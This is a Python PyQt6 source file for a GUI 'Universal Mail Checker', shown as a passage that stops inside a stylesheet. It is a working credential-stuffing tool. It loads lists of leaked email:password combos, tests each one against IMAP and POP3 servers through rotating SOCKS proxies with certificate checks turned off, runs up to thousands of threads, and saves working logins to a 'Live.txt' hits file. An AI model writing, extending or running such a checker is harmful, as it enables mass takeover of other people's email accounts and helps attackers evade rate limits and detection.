import sys
import os
import ssl
import imaplib
import poplib
import socket
import threading
import time
import re
import email
from email.header import decode_header
from queue import Queue
from datetime import datetime, timedelta
from collections import deque, defaultdict
from concurrent.futures import ThreadPoolExecutor
import logging
import gc

try:
    import socks
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False
    print("Warning: 'PySocks' library not found. SOCKS4/SOCKS5 proxy support will be disabled.")
    print("Please install it using: pip install PySocks")

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QPushButton, QLineEdit, QLabel, QFileDialog, QMessageBox,
    QTableWidget, QTableWidgetItem, QHeaderView, QDialog,
    QFormLayout, QSpinBox, QTabWidget, QStatusBar, QDialogButtonBox,
    QMenu, QTextEdit, QCheckBox, QGroupBox, QComboBox, QFrame, QProgressBar
)
from PyQt6.QtCore import QThread, pyqtSignal, QObject, Qt, QSettings, QTimer
from PyQt6.QtGui import QFont, QColor, QBrush, QTextCursor

logging.basicConfig(level=logging.WARNING,
                    format='%(asctime)s - %(levelname)s - %(message)s',
                    handlers=[logging.FileHandler("universal_mail_checker_debug.log", mode='w', encoding='utf-8')])


def decode_mime_header(header):
    """Decode MIME encoded email headers"""
    if header is None:
        return ""
    decoded_parts = decode_header(header)
    parts = []
    for part, charset in decoded_parts:
        if isinstance(part, bytes):
            try:
                parts.append(part.decode(charset or 'utf-8', errors='ignore'))
            except (LookupError, TypeError):
                parts.append(part.decode('utf-8', errors='ignore'))
        else:
            parts.append(str(part))
    return "".join(parts)


def parse_email_body(msg):
    """Parse email body from message"""
    body = ""
    if msg.is_multipart():
        for part in msg.walk():
            content_type = part.get_content_type()
            content_disposition = str(part.get("Content-Disposition"))
            
            if content_type in ["text/plain", "text/html"] and "attachment" not in content_disposition:
                try:
                    payload = part.get_payload(decode=True)
                    charset = part.get_content_charset() or 'utf-8'
                    part_body = payload.decode(charset, errors='replace')
                    body += part_body + "\n"
                except Exception:
                    continue
    else:
        try:
            payload = msg.get_payload(decode=True)
            charset = msg.get_content_charset() or 'utf-8'
            body = payload.decode(charset, errors='replace')
        except Exception as e:
            body = f"[Could not decode body: {e}]"
    return body



class ServerManager:
    """Manages IMAP and POP3 server configurations"""
    def __init__(self):
        self.imap_servers = {}
        self.pop_servers = {}
        self.load_server_configs()
    
    def load_server_configs(self):
        """Load server configurations from files"""
        # Load IMAP servers
        imap_file = os.path.join(os.path.dirname(__file__), 'imap_servers.txt')
        if os.path.exists(imap_file):
            with open(imap_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        parts = line.split(',')
                        if len(parts) == 2:
                            domain, server = parts[0].strip(), parts[1].strip()
                            self.imap_servers[domain] = server
        
        # Load POP3 servers
        pop_file = os.path.join(os.path.dirname(__file__), 'pop_servers.txt')
        if os.path.exists(pop_file):
            with open(pop_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        parts = line.split(',')
                        if len(parts) == 2:
                            domain, server = parts[0].strip(), parts[1].strip()
                            self.pop_servers[domain] = server
    
    def get_imap_server(self, domain):
        """Get IMAP server for domain"""
        if domain in self.imap_servers:
            return self.imap_servers[domain], 993
        return f"imap.{domain}", 993
    
    def get_pop_server(self, domain):
        """Get POP3 server for domain"""
        if domain in self.pop_servers:
            return self.pop_servers[domain], 995
        return f"pop.{domain}", 995


class AutoDiscovery:
    """Auto-discovers mail servers for common providers"""
    @staticmethod
    def get_common_servers(domain):
        """Returns list of common server patterns to try"""
        common_imap = [
            f"imap.{domain}",
            f"mail.{domain}",
            f"imap.mail.{domain}"
        ]
        common_pop = [
            f"pop.{domain}",
            f"pop3.{domain}",
            f"mail.{domain}"
        ]
        return common_imap, common_pop


class WorkerSignals(QObject):
    progress = pyqtSignal(int, int, int, int, int)  # checked, hits, invalids, errors, intelligence
    log = pyqtSignal(str, QColor)
    finished = pyqtSignal(dict, float, int)
    cpm = pyqtSignal(int)
    add_hit = pyqtSignal(str, str, str)  # combo, protocol, capture
    add_invalid = pyqtSignal(str, str)
    add_error = pyqtSignal(str, str)
    add_intelligence_hit = pyqtSignal(str, str, str, str, list)  # email, match_type, match_detail, mailbox, details_list


class MailCheckerWorker(QObject):
    def __init__(self, settings):
        super().__init__()
        self.settings = settings
        self.is_running = True
        self.is_paused = False
        self.stats = {'hits': 0, 'invalids': 0, 'errors': 0, 'checked': 0, 'intelligence_hits': 0}
        
        self.session_folder = self.create_session_folder()
        
        # File paths - CRITICAL: Use exact names from problem statement
        self.settings['live_file'] = os.path.join(self.session_folder, 'Live.txt')
        self.settings['banned_file'] = os.path.join(self.session_folder, 'Banned.txt')
        self.settings['unknown_file'] = os.path.join(self.session_folder, 'Unknown.txt')
        self.settings['invalids_file'] = os.path.join(self.session_folder, 'invalids.txt')
        self.settings['intelligence_results_folder'] = os.path.join(self.session_folder, 'intelligence_results')
        
        self.combo_file_path = None
        self.proxies = []
        
        self.signals = WorkerSignals()
        self.server_manager = ServerManager()
        
        self.start_time = 0
        self.checks_in_last_minute = deque(maxlen=1000)
        self._progress_counter = 0
        self.stats_lock = threading.Lock()
        
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
        self.use_proxies = settings.get('use_proxies', False)
        self.proxy_type = settings.get('proxy_type', 'HTTP/HTTPS')
        self.smart_search = settings.get('smart_search', False)

    def create_session_folder(self):
        base_folder = "Results"
        os.makedirs(base_folder, exist_ok=True)
        
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        session_folder = os.path.join(base_folder, timestamp)
        os.makedirs(session_folder, exist_ok=True)
        
        # Create intelligence_results folder if Smart Search is enabled
        if self.settings.get('smart_search', False):
            intelligence_folder = os.path.join(session_folder, "intelligence_results")
            os.makedirs(intelligence_folder, exist_ok=True)
        
        logging.info(f"Created session folder: {session_folder}")
        return session_folder

    def setup_proxy(self, proxy_string):
        if not self.use_proxies or not proxy_string:
            if hasattr(socket, '_original_socket'):
                socket.socket = socket._original_socket
            return True
            
        try:
            parts = proxy_string.strip().split(':')
            if len(parts) < 2:
                return False
                
            proxy_host = parts[0]
            proxy_port = int(parts[1])
            proxy_username = parts[2] if len(parts) > 2 else self.settings.get('proxy_username', '')
            proxy_password = parts[3] if len(parts) > 3 else self.settings.get('proxy_password', '')
            
            if self.proxy_type in ['SOCKS4', 'SOCKS5']:
                if not SOCKS_AVAILABLE:
                    return False
                
                if not hasattr(socket, '_original_socket'):
                    socket._original_socket = socket.socket
                
                proxy_type_map = {
                    'SOCKS4': socks.SOCKS4,
                    'SOCKS5': socks.SOCKS5
                }
                
                socks.set_default_proxy(
                    proxy_type_map[self.proxy_type],
                    proxy_host,
                    proxy_port,
                    True,
                    proxy_username if proxy_username else None,
                    proxy_password if proxy_password else None
                )
                socket.socket = socks.socksocket
            
            return True
            
        except Exception as e:
            logging.error(f"Failed to setup proxy {proxy_string}: {e}")
            if hasattr(socket, '_original_socket'):
                socket.socket = socket._original_socket
            return False

    def stop(self):
        self.is_running = False

    def toggle_pause(self):
        self.is_paused = not self.is_paused

    def try_pop3_login(self, email_addr, password, server, port, timeout=5):
        """Try POP3 login"""
        if not self.is_running:
            return False, None, 'stopped'
        
        pop_conn = None
        try:
            pop_conn = poplib.POP3_SSL(server, port, timeout=timeout, context=self.ssl_context)
            
            if not self.is_running:
                try:
                    pop_conn.quit()
                except:
                    pass
                return False, None, 'stopped'
            
            pop_conn.user(email_addr)
            pop_conn.pass_(password)
            stat_response = pop_conn.stat()
            message_count = stat_response[0] if stat_response else 0
            pop_conn.quit()
            return True, f"{message_count} messages", None
            
        except poplib.error_proto as e:
            if pop_conn:
                try:
                    pop_conn.quit()
                except:
                    pass
            return False, None, 'invalid'
            
        except (socket.timeout, TimeoutError):
            if pop_conn:
                try:
                    pop_conn.quit()
                except:
                    pass
            return False, None, 'timeout'
            
        except Exception as e:
            if pop_conn:
                try:
                    pop_conn.quit()
                except:
                    pass
            return False, None, str(e)[:30]

    def try_imap_login(self, email_addr, password, server, port, timeout=5):
        """Try IMAP login"""
        if not self.is_running:
            return False, None, 'stopped'
        
        imap_conn = None
        try:
            imap_conn = imaplib.IMAP4_SSL(
                host=server, 
                port=port, 
                ssl_context=self.ssl_context, 
                timeout=timeout
            )
            
            if not self.is_running:
                try:
                    imap_conn.logout()
                except:
                    pass
                return False, None, 'stopped'
            
            typ, data = imap_conn.login(email_addr, password)
            
            if typ == 'OK':
                # Get mailbox info
                try:
                    imap_conn.select('INBOX', readonly=True)
                    typ, data = imap_conn.search(None, 'ALL')
                    if typ == 'OK' and data[0]:
                        message_count = len(data[0].split())
                    else:
                        message_count = 0
                    capture = f"{message_count} messages"
                except:
                    capture = "Valid"
                
                try:
                    imap_conn.logout()
                except:
                    pass
                return True, capture, None
            else:
                try:
                    imap_conn.logout()
                except:
                    pass
                return False, None, 'invalid'
                
        except (imaplib.IMAP4.error, imaplib.IMAP4.abort):
            if imap_conn:
                try:
                    imap_conn.logout()
                except:
                    pass
            return False, None, 'invalid'
            
        except (socket.timeout, TimeoutError):
            if imap_conn:
                try:
                    imap_conn.logout()
                except:
                    pass
            return False, None, 'timeout'
            
        except Exception as e:
            if imap_conn:
                try:
                    imap_conn.logout()
                except:
                    pass
            return False, None, str(e)[:30]

    def check_single_combo(self, combo):
        if not self.is_running:
            return None
            
        try:
            email_addr, password = combo.strip().split(self.settings['delimiter'])
            domain = email_addr.split('@')[1]
            combo_str = f"{email_addr}:{password}"
            
            # Setup proxy if enabled
            if self.use_proxies and self.proxies:
                import random
                proxy = random.choice(self.proxies)
                self.setup_proxy(proxy)
            
            timeout = self.settings['timeout']
            
            if self.smart_search:
                # Smart Search ON: IMAP only
                imap_server, imap_port = self.server_manager.get_imap_server(domain)
                success, capture, error = self.try_imap_login(email_addr, password, imap_server, imap_port, timeout)
                
                if success:
                    return {
                        'status': 'hit',
                        'combo': combo_str,
                        'protocol': 'IMAP',
                        'capture': capture
                    }
                elif error == 'invalid':
                    return {'status': 'invalid', 'combo': combo_str, 'reason': 'Invalid credentials'}
                elif error == 'stopped':
                    return None
                else:
                    return {'status': 'error', 'combo': combo_str, 'reason': f'Error: {error}'}
            
            else:
                # Smart Search OFF: POP3 first, then IMAP with 2-second delay
                pop_server, pop_port = self.server_manager.get_pop_server(domain)
                success, capture, error = self.try_pop3_login(email_addr, password, pop_server, pop_port, timeout)
                
                if success:
                    return {
                        'status': 'hit',
                        'combo': combo_str,
                        'protocol': 'POP3',
                        'capture': capture
                    }
                elif error == 'invalid':
                    return {'status': 'invalid', 'combo': combo_str, 'reason': 'Invalid credentials'}
                elif error == 'stopped':
                    return None
                
                # If POP3 failed (timeout/error), wait 2 seconds and try IMAP
                if error in ['timeout', 'connection_failed'] or error.startswith('Error'):
                    self.signals.log.emit(f"Waiting 2s before IMAP retry for {email_addr}...", QColor("#ff9800"))
                    time.sleep(2)
                    
                    imap_server, imap_port = self.server_manager.get_imap_server(domain)
                    success, capture, error = self.try_imap_login(email_addr, password, imap_server, imap_port, timeout)
                    
                    if success:
                        return {
                            'status': 'hit',
                            'combo': combo_str,
                            'protocol': 'IMAP',
                            'capture': capture
                        }
                    elif error == 'invalid':
                        return {'status': 'invalid', 'combo': combo_str, 'reason': 'Invalid credentials'}
                    elif error == 'stopped':
                        return None
                    else:
                        return {'status': 'error', 'combo': combo_str, 'reason': f'Error: {error}'}
                
                return {'status': 'error', 'combo': combo_str, 'reason': f'Error: {error}'}
                
        except ValueError:
            return {'status': 'error', 'combo': combo, 'reason': 'Malformed combo'}
        except Exception as e:
            return {'status': 'error', 'combo': combo, 'reason': str(e)[:50]}

    def process_result(self, result, live_file, banned_file, unknown_file, invalids_file):
        if result is None:
            return
        
        with self.stats_lock:
            self.stats['checked'] += 1
            
            if result['status'] == 'hit':
                self.stats['hits'] += 1
            elif result['status'] == 'invalid':
                self.stats['invalids'] += 1
            elif result['status'] == 'error':
                self.stats['errors'] += 1
        
        if result['status'] == 'hit':
            protocol = result.get('protocol', 'Unknown')
            capture = result.get('capture', 'Valid')
            # CRITICAL: Live.txt format is "email:pass" ONLY - NO protocol, NO capture info
            live_file.write(f"{result['combo']}\n")
            live_file.flush()
            # Display includes protocol info in GUI
            self.signals.log.emit(f"HIT -> {result['combo']} | {protocol} | {capture}", QColor("#4ade80"))
            self.signals.add_hit.emit(result['combo'], protocol, capture)
            
        elif result['status'] == 'invalid':
            # Write to both Banned.txt and invalids.txt as per problem statement
            banned_file.write(f"{result['combo']}\n")
            invalids_file.write(f"{result['combo']}\n")
            if self.stats['invalids'] % 100 == 0:
                banned_file.flush()
                invalids_file.flush()
            self.signals.add_invalid.emit(result['combo'], result.get('reason', 'Invalid'))
            
        elif result['status'] == 'error':
            # Unknown.txt for errors
            unknown_file.write(f"{result['combo']}\n")
            if self.stats['errors'] % 50 == 0:
                unknown_file.flush()
            
            self.signals.add_error.emit(result['combo'], result.get('reason', 'Error'))
        
        self.checks_in_last_minute.append(time.monotonic())
        
        self._progress_counter += 1
        if self._progress_counter >= 25:
            with self.stats_lock:
                self.signals.progress.emit(
                    self.stats['checked'], 
                    self.stats['hits'], 
                    self.stats['invalids'], 
                    self.stats['errors'],
                    self.stats['intelligence_hits']
                )
            self._progress_counter = 0
            
            now = time.monotonic()
            cutoff = now - 60
            
            while self.checks_in_last_minute and self.checks_in_last_minute[0] < cutoff:
                self.checks_in_last_minute.popleft()
            
            self.signals.cpm.emit(len(self.checks_in_last_minute))

    def run(self):
        self.start_time = time.time()
        executor = None
        live_file = None
        banned_file = None
        unknown_file = None
        invalids_file = None
        
        try:
            max_workers = self.settings['threads']
            
            live_file = open(self.settings['live_file'], 'w', encoding='utf-8', buffering=8192)
            banned_file = open(self.settings['banned_file'], 'w', encoding='utf-8', buffering=8192)
            unknown_file = open(self.settings['unknown_file'], 'w', encoding='utf-8', buffering=8192)
            invalids_file = open(self.settings['invalids_file'], 'w', encoding='utf-8', buffering=8192)
            
            try:
                executor = ThreadPoolExecutor(max_workers=max_workers)
                
                active_futures = {}
                max_queue_size = max_workers * 6
                
                try:
                    with open(self.combo_file_path, 'r', encoding='utf-8', errors='ignore') as combo_file:
                        combo_iterator = iter(combo_file)
                        submitting = True
                        
                        while submitting or active_futures:
                            if not self.is_running:
                                for future in list(active_futures.keys()):
                                    future.cancel()
                                active_futures.clear()
                                break
                            
                            while self.is_paused:
                                time.sleep(0.1)
                                if not self.is_running:
                                    break
                            
                            if not self.is_running:
                                break
                            
                            while submitting and len(active_futures) < max_queue_size:
                                if not self.is_running:
                                    break
                                
                                try:
                                    line = next(combo_iterator)
                                    line = line.strip()
                                    if line:
                                        future = executor.submit(self.check_single_combo, line)
                                        active_futures[future] = line
                                except StopIteration:
                                    submitting = False
                                    break
                                except Exception as e:
                                    logging.error(f"Submit error: {e}")
                                    break
                            
                            done_futures = [f for f in list(active_futures.keys()) if f.done()]
                            
                            for future in done_futures:
                                try:
                                    result = future.result(timeout=0.01)
                                    if result is not None:
                                        self.process_result(result, live_file, banned_file, unknown_file, invalids_file)
                                except Exception as e:
                                    if self.is_running:
                                        logging.error(f"Result error: {e}")
                                finally:
                                    active_futures.pop(future, None)
                            
                            if not done_futures and active_futures:
                                time.sleep(0.01)
                
                except Exception as e:
                    logging.error(f"File reading error: {e}")
            
            finally:
                if executor:
                    try:
                        if sys.version_info >= (3, 9):
                            executor.shutdown(wait=False, cancel_futures=True)
                        else:
                            executor.shutdown(wait=False)
                    except Exception as e:
                        logging.error(f"Executor shutdown error: {e}")
                    
        except Exception as e:
            logging.error(f"Worker critical error: {e}")
        finally:
            try:
                if live_file:
                    live_file.close()
                if banned_file:
                    banned_file.close()
                if unknown_file:
                    unknown_file.close()
                if invalids_file:
                    invalids_file.close()
            except:
                pass
            
            with self.stats_lock:
                self.signals.progress.emit(
                    self.stats['checked'], 
                    self.stats['hits'], 
                    self.stats['invalids'], 
                    self.stats['errors'],
                    self.stats['intelligence_hits']
                )
            
            elapsed_time = time.time() - self.start_time
            final_cpm = int((self.stats['checked'] / elapsed_time) * 60) if elapsed_time > 0 else 0
            
            self.signals.finished.emit(self.stats, elapsed_time, final_cpm)



class SettingsDialog(QDialog):
    def __init__(self, settings_manager, parent=None):
        super().__init__(parent)
        self.settings_manager = settings_manager
        self.setWindowTitle("Settings")
        self.setMinimumWidth(600)
        self.setStyleSheet("""
            QDialog {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:1,
                    stop:0 #0f0f0f, stop:1 #1a1a1a);
            }
            QLabel {
                color: #d4d4d4;
                font-size: 11pt;
                font-weight: 500;
            }
            QSpinBox, QLineEdit, QComboBox {
                background: rgba(64, 64, 64, 0.3);
                color: #d4d4d4;
                border: 2px solid #404040;
                border-radius: 8px;
                padding: 10px;
                font-size: 10pt;
            }
            QSpinBox:focus, QLineEdit:focus, QComboBox:focus {
                border: 2px solid #737373;
                background: rgba(64, 64, 64, 0.5);
            }
            QCheckBox {
                color: #d4d4d4;
                font-size: 11pt;
            }
            QCheckBox::indicator {
                width: 20px;
                height: 20px;
                border-radius: 6px;
                border: 2px solid #525252;
                background: rgba(64, 64, 64, 0.3);
            }
            QCheckBox::indicator:checked {
                background: #a3a3a3;
                border: 2px solid #a3a3a3;
            }
            QTabWidget::pane {
                border: 2px solid #404040;
                border-radius: 8px;
                background: rgba(26, 26, 26, 0.5);
            }
            QTabBar::tab {
                background: rgba(64, 64, 64, 0.3);
                color: #737373;
                padding: 10px 20px;
                border-radius: 8px;
                margin-right: 5px;
            }
            QTabBar::tab:selected {
                background: #525252;
                color: #d4d4d4;
            }
            QGroupBox {
                border: 2px solid rgba(115, 115, 115, 0.3);
                border-radius: 8px;
                margin-top: 10px;
                padding-top: 10px;
                font-weight: bold;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px;
            }
        """)
        
        self.layout = QVBoxLayout(self)
        
        tabs = QTabWidget()
        self.layout.addWidget(tabs)
        
        general_tab = QWidget()
        proxy_tab = QWidget()

        tabs.addTab(general_tab, "General")
        tabs.addTab(proxy_tab, "Proxy")

        self.init_general_tab(general_tab)
        self.init_proxy_tab(proxy_tab)
        
        self.buttons = QDialogButtonBox(QDialogButtonBox.StandardButton.Ok | QDialogButtonBox.StandardButton.Cancel)
        self.buttons.button(QDialogButtonBox.StandardButton.Ok).setStyleSheet("""
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #525252, stop:1 #737373);
                color: white;
                border: none;
                border-radius: 8px;
                padding: 12px 30px;
                font-weight: bold;
                font-size: 10pt;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #737373, stop:1 #a3a3a3);
            }
        """)
        self.buttons.button(QDialogButtonBox.StandardButton.Cancel).setStyleSheet("""
            QPushButton {
                background: rgba(64, 64, 64, 0.3);
                color: #d4d4d4;
                border: 2px solid #404040;
                border-radius: 8px;
                padding: 12px 30px;
                font-weight: bold;
                font-size: 10pt;
            }
            QPushButton:hover {
                background: rgba(64, 64, 64, 0.5);
                border: 2px solid #525252;
            }
        """)
        self.buttons.accepted.connect(self.accept)
        self.buttons.rejected.connect(self.reject)
        self.layout.addWidget(self.buttons)
        
        self.load_settings()

    def init_general_tab(self, tab):
        layout = QFormLayout(tab)
        layout.setSpacing(15)
        
        self.threads_spinbox = QSpinBox()
        self.threads_spinbox.setRange(10, 5000)
        self.threads_spinbox.setSingleStep(50)
        
        self.timeout_spinbox = QSpinBox()
        self.timeout_spinbox.setRange(1, 120)
        self.timeout_spinbox.setSuffix(" seconds")
        
        self.delimiter_edit = QLineEdit()
        
        self.smart_search_checkbox = QCheckBox("Smart Search (IMAP Only)")
        self.smart_search_checkbox.setStyleSheet("color: #4ade80; font-weight: bold;")
        
        note_label = QLabel("Smart Search ON = IMAP only | OFF = POP3→IMAP with 2s delay")
        note_label.setStyleSheet("color: #00bcd4; font-size: 9pt; padding: 5px;")
        note_label.setWordWrap(True)

        layout.addRow("Threads:", self.threads_spinbox)
        layout.addRow("Timeout:", self.timeout_spinbox)
        layout.addRow("Combo Delimiter:", self.delimiter_edit)
        layout.addRow("", self.smart_search_checkbox)
        layout.addRow("", note_label)

    def init_proxy_tab(self, tab):
        layout = QVBoxLayout(tab)
        layout.setSpacing(15)
        
        self.use_proxies_checkbox = QCheckBox("Enable Proxies")
        layout.addWidget(self.use_proxies_checkbox)
        
        proxy_type_group = QGroupBox("Proxy Configuration")
        proxy_form = QFormLayout(proxy_type_group)
        proxy_form.setSpacing(12)
        
        self.proxy_type_combo = QComboBox()
        self.proxy_type_combo.addItems(["HTTP/HTTPS", "SOCKS4", "SOCKS5"])
        proxy_form.addRow("Proxy Type:", self.proxy_type_combo)
        
        self.proxy_username_edit = QLineEdit()
        self.proxy_username_edit.setPlaceholderText("Optional")
        proxy_form.addRow("Username:", self.proxy_username_edit)
        
        self.proxy_password_edit = QLineEdit()
        self.proxy_password_edit.setEchoMode(QLineEdit.EchoMode.Password)
        self.proxy_password_edit.setPlaceholderText("Optional")
        proxy_form.addRow("Password:", self.proxy_password_edit)
        
        layout.addWidget(proxy_type_group)
        
        if not SOCKS_AVAILABLE:
            warning_label = QLabel("PySocks not installed - SOCKS disabled")
            warning_label.setStyleSheet("color: #ffc107; font-weight: bold; padding: 10px;")
            layout.addWidget(warning_label)
            self.proxy_type_combo.model().item(1).setEnabled(False)
            self.proxy_type_combo.model().item(2).setEnabled(False)
        
        layout.addStretch()
        
        self.use_proxies_checkbox.toggled.connect(proxy_type_group.setEnabled)
        proxy_type_group.setEnabled(False)

    def load_settings(self):
        s = self.settings_manager
        self.threads_spinbox.setValue(s.value("threads", 200, type=int))
        self.timeout_spinbox.setValue(s.value("timeout", 10, type=int))
        self.delimiter_edit.setText(s.value("delimiter", ":"))
        self.smart_search_checkbox.setChecked(s.value("smart_search", False, type=bool))
        
        self.use_proxies_checkbox.setChecked(s.value("use_proxies", False, type=bool))
        
        proxy_type = s.value("proxy_type", "HTTP/HTTPS")
        index = self.proxy_type_combo.findText(proxy_type)
        if index >= 0:
            self.proxy_type_combo.setCurrentIndex(index)
        
        self.proxy_username_edit.setText(s.value("proxy_username", ""))
        self.proxy_password_edit.setText(s.value("proxy_password", ""))

    def accept(self):
        s = self.settings_manager
        s.setValue("threads", self.threads_spinbox.value())
        s.setValue("timeout", self.timeout_spinbox.value())
        s.setValue("delimiter", self.delimiter_edit.text())
        s.setValue("smart_search", self.smart_search_checkbox.isChecked())
        
        s.setValue("use_proxies", self.use_proxies_checkbox.isChecked())
        s.setValue("proxy_type", self.proxy_type_combo.currentText())
        s.setValue("proxy_username", self.proxy_username_edit.text())
        s.setValue("proxy_password", self.proxy_password_edit.text())
        super().accept()



class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("UNIVERSAL MAIL CHECKER")
        self.setMinimumSize(1280, 720)
        
        self.settings = QSettings("UniversalMailChecker", "Universal")
        
        self.worker = None
        self.worker_thread = None

        self.is_running = False
        self.is_paused = False
        self.combos_loaded = 0
        self.combos_file_path = None
        self.proxies_loaded = 0
        
        self.current_session_folder = None

        self.init_ui()
        self.create_menu_bar()
        self.init_actions()
        self.apply_theme()

        self.progress_timer = QTimer()
        self.progress_timer.timeout.connect(self.timer_update_progress)
        self.progress_timer.start(500)
        self.last_gui_stats = (0, 0, 0, 0, 0)  # checked, hits, invalids, errors, intelligence
        self.cpm = 0
        
        self.max_table_rows = 1000
        
        self._hit_batch = []
        self._invalid_batch = []
        self._error_batch = []

    def create_menu_bar(self):
        menubar = self.menuBar()
        
        file_menu = menubar.addMenu("&File")
        
        load_combos_action = file_menu.addAction("Load Combos")
        load_combos_action.triggered.connect(self.load_combos)
        
        load_proxies_action = file_menu.addAction("Load Proxies")
        load_proxies_action.triggered.connect(self.load_proxies)
        
        file_menu.addSeparator()
        
        open_results_action = file_menu.addAction("Open Results Folder")
        open_results_action.triggered.connect(self.open_results_folder)
        
        file_menu.addSeparator()
        
        exit_action = file_menu.addAction("Exit")
        exit_action.triggered.connect(self.close)
        
        tools_menu = menubar.addMenu("&Tools")
        
        settings_action = tools_menu.addAction("Settings")
        settings_action.triggered.connect(self.open_settings)
        
        tools_menu.addSeparator()
        
        export_menu = tools_menu.addMenu("Export Results")
        export_menu.addAction("Export Hits...", lambda: self.export_table(self.results_table_hits))
        export_menu.addAction("Export Invalids...", lambda: self.export_table(self.results_table_invalids))
        export_menu.addAction("Export Errors...", lambda: self.export_table(self.results_table_errors))
        
        tools_menu.addSeparator()
        
        clear_results_action = tools_menu.addAction("Clear Results")
        clear_results_action.triggered.connect(self.clear_results)

    def clear_results(self):
        reply = QMessageBox.question(self, "Clear Results", 
                                     "Are you sure you want to clear all results?",
                                     QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                                     QMessageBox.StandardButton.No)
        if reply == QMessageBox.StandardButton.Yes:
            self.results_table_hits.setRowCount(0)
            self.results_table_invalids.setRowCount(0)
            self.results_table_errors.setRowCount(0)
            self.log_box.clear()
            self.progress_bar.setValue(0)
            
            self.stat_widgets['checked'].value_label.setText("0")
            self.stat_widgets['hits'].value_label.setText("0")
            self.stat_widgets['invalids'].value_label.setText("0")
            self.stat_widgets['errors'].value_label.setText("0")
            self.stat_widgets['cpm'].value_label.setText("0")
            
            self.tabs.setTabText(0, "HITS (0)")
            self.tabs.setTabText(1, "INVALIDS (0)")
            self.tabs.setTabText(2, "ERRORS (0)")
            
            self._hit_batch = []
            self._invalid_batch = []
            self._error_batch = []
            
            gc.collect()
            
            self.update_status("Results cleared", "#a3a3a3")

    def init_ui(self):
        self.central_widget = QWidget()
        self.setCentralWidget(self.central_widget)
        self.main_layout = QVBoxLayout(self.central_widget)
        self.main_layout.setSpacing(15)
        self.main_layout.setContentsMargins(20, 20, 20, 20)

        header = QHBoxLayout()
        
        title_section = QVBoxLayout()
        title = QLabel("UNIVERSAL MAIL CHECKER")
        title.setFont(QFont("Segoe UI", 24, QFont.Weight.Bold))
        title.setStyleSheet("color: #d4d4d4; letter-spacing: 3px;")
        
        subtitle = QLabel("MOATTYA")
        subtitle.setFont(QFont("Segoe UI", 10))
        subtitle.setStyleSheet("color: #737373;")
        
        title_section.addWidget(title)
        title_section.addWidget(subtitle)
        
        header.addLayout(title_section)
        header.addStretch()
        
        self.btn_start = self.create_button("START", "#525252", "#737373")
        self.btn_pause = self.create_button("PAUSE", "#404040", "#525252")
        self.btn_stop = self.create_button("STOP", "#262626", "#404040")
        
        self.btn_pause.setEnabled(False)
        self.btn_stop.setEnabled(False)
        
        header.addWidget(self.btn_start)
        header.addWidget(self.btn_pause)
        header.addWidget(self.btn_stop)
        
        self.main_layout.addLayout(header)
        
        stats_frame = QFrame()
        stats_frame.setStyleSheet("""
            QFrame {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 rgba(64, 64, 64, 0.2), 
                    stop:0.5 rgba(82, 82, 82, 0.1),
                    stop:1 rgba(64, 64, 64, 0.2));
                border: 2px solid rgba(115, 115, 115, 0.3);
                border-radius: 15px;
                padding: 20px;
            }
        """)
        stats_layout = QHBoxLayout(stats_frame)
        stats_layout.setSpacing(20)
        
        self.stat_widgets = {}
        stats_data = [
            ("CHECKED", "0", "#525252"),
            ("HITS", "0", "#4ade80"),
            ("INVALIDS", "0", "#a3a3a3"),
            ("ERRORS", "0", "#d4d4d4"),
            ("CPM", "0", "#e5e5e5"),
        ]
        
        for label_text, value, color in stats_data:
            stat_widget = self.create_stat_card(label_text, value, color)
            self.stat_widgets[label_text.lower()] = stat_widget
            stats_layout.addWidget(stat_widget)
        
        self.main_layout.addWidget(stats_frame)
        
        file_controls = QHBoxLayout()
        file_controls.setSpacing(15)
        
        self.combos_info = QLabel("Combos: 0")
        self.combos_info.setFont(QFont("Segoe UI", 11, QFont.Weight.Bold))
        self.combos_info.setStyleSheet("color: #a3a3a3; padding: 8px;")
        
        self.proxies_info = QLabel("Proxies: 0")
        self.proxies_info.setFont(QFont("Segoe UI", 11, QFont.Weight.Bold))
        self.proxies_info.setStyleSheet("color: #a3a3a3; padding: 8px;")
        
        file_controls.addWidget(self.combos_info)
        file_controls.addWidget(self.proxies_info)
        file_controls.addStretch()
        
        btn_load_combos = self.create_small_button("Load Combos")
        btn_load_proxies = self.create_small_button("Load Proxies")
        
        self.btn_open_results = self.create_small_button("Results")
        self.btn_open_results.clicked.connect(self.open_results_folder)
        
        btn_settings = self.create_small_button("Settings")
        
        btn_load_combos.clicked.connect(self.load_combos)
        btn_load_proxies.clicked.connect(self.load_proxies)
        btn_settings.clicked.connect(self.open_settings)
        
        file_controls.addWidget(btn_load_combos)
        file_controls.addWidget(btn_load_proxies)
        file_controls.addWidget(self.btn_open_results)
        file_controls.addWidget(btn_settings)
        
        self.main_layout.addLayout(file_controls)
        
        self.progress_bar = QProgressBar()
        self.progress_bar.setFixedHeight(20)
        self.progress_bar.setStyleSheet("""
            QProgressBar {
                background: rgba(64, 64, 64, 0.3);
                border: 2px solid rgba(115, 115, 115, 0.3);
                border-radius: 10px;
                text-align: center;
                color: #d4d4d4;
                font-weight: bold;
                font-size: 10pt;
            }
            QProgressBar::chunk {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #404040, stop:0.5 #525252, stop:1 #737373);
                border-radius: 8px;
            }
        """)
        self.main_layout.addWidget(self.progress_bar)
        
        self.tabs = QTabWidget()
        self.tabs.setStyleSheet("""
            QTabWidget::pane {
                border: 2px solid rgba(115, 115, 115, 0.3);
                border-radius: 10px;
